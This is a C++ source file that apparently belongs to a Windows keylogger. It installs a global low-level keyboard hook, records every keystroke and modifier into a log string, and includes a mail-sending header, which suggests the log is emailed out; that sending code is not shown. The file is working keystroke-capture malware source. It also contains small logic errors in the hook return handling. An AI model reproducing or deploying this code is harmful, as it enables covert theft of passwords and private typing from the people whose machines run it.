#include <iostream>
#include <fstream>
#include <windows.h>

#include <vector>
#include <string>

#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

#include "KeyboardManager.h"

KeyboardManager::KeyboardManager()
{ }

LRESULT KeyboardManager::KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);
	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;

	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		keylog += KEYS[kbs->vkCode].Name;
		if (kbs->vkCode == VK_RETURN)
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL
			|| key == VK_LCONTROL
			|| key == VK_RCONTROL
			|| key == VK_SHIFT
			|| key == VK_RSHIFT
			|| key == VK_LSHIFT
			|| key == VK_MENU
			|| key == VK_LMENU
			|| key == VK_RMENU
			|| key == VK_CAPITAL
			|| key == VK_NUMLOCK
			|| key == VK_LWIN
			|| key == VK_RWIN)
		{
			std::string KeyName = KEYS[kbs->vkCode].Name;
			KeyName.insert(1, "/");
			keylog += KeyName;
		}
	}

	return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool KeyboardManager::InstallHooks()
{
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, GetModuleHandle(NULL), 0);
	IO::WriteAppLog("Keyboard Hook Started");

	return eHook == NULL;
}

bool KeyboardManager::UninstallHooks()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	IO::WriteAppLog("Keyboard Hook Stopped");
	eHook = NULL;
	return b;
}
